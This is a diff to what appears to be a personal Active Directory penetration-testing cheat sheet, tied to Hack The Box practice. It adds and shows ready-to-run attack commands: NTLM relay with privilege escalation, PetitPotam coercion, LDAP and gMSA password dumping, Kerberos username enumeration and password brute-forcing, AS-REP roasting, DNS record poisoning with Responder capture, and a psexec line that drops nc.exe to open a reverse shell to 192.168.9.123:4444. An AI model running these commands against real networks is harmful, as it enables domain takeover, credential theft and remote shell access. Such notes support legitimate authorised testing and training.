@@ -64,13 +64,36 @@ python3 ntlmrelayx.py --remove-mic --escalate-user hack -t ldap://<attacker ip> 
 python3 PetitPotam.py -d <domain> -u <user> -p <password> <attacker ip> <target ip>
 ```
 
+Dumping LDAP
+
+```shell
+ldapsearch -LLL -x -H ldap://<target ip> -b '' -s base '(objectclass=*)'
+# with credential, e.g., domain = test.local
+ldapsearch -H ldap://<target ip> -x -W -D "<user>@test.local" -b "dc=<test>,dc=<local>"
+```
+
+search smb vulnerability
+
+```shell
+nmap --script "safe or smb-enum-*" -p 445 <target ip>
+```
+
+Read gMSA password (```ReadGMSAPassword``` and ```AllowedToDelegate``` rights) (HTB BOX:Intelligence)
+
+```
+git clone https://github.com/micahvandeusen/gMSADumper.git
+python3 gMSADumper.py -u <user> -p <password> -d <domain>
+```
+
 enumerate domain usernames
 
 ```shell
 # 1
-kerbrute_linux_amd64 --dc <Domain Controller> -d <Active Directory Domain> userenum  ~/Documents/userlist.txt
+kerbrute_linux_amd64 -t 10 --dc <domain controller> -d <domain> userenum  ~/Documents/userlist.txt
 # 2 valid users
 kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt | grep "USERNAME" | cut -f1 -d"@" | cut -f4 -d":" | tr -d "[:blank:]" > /tmp/users.txt
+# bruteuser
+./kerbrute_linux_amd64 -t 10 --dc <domain controller> -d <domain> bruteuser ~/Documents/rockyou.txt <user>
 ```
 
 [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
@@ -81,8 +104,14 @@ python3 GetNPUsers.py <domain>/ -dc-ip <target ip> -usersfile <userlist> -format
 
 change password (STATUS_PASSWORD_MUST_CHANGE)
 
-```
+```shell
 smbpasswd -U <user_name> -r <target ip>
+```
+
+mount Windows shares
+
+```shell
+mount -t cifs //<target ip>/<folder> <attacker folder> -o username=<user>
 ```
 
 ### :open_file_folder: PowerView
@@ -223,6 +252,15 @@ psexec.py <domain>/<username>:'<password>'@<target ip>
 # example
 psexec.py punipunidenki.local/administrator:'f!wef23424;'@192.168.9.100 "-e cmd.exe 192.168.9.123 4444" -c ~/Documents/nc.exe
 # -c pathname copy the filename for later execution, arguments are passed in the command option
+```
+
+### :open_file_folder: [Krbrelayx](https://github.com/dirkjanm/krbrelayx)
+
+```shell
+# add AD Integrated DNS records
+python3 dnstool.py -u '<domain>\<user>' -p <password> <target ip> -a add -r <TARGETRECORD> -d <attacker ip> -t A
+# get information in a few minutes
+responder -I tun0
 ```
 
 ### :open_file_folder: Extracting
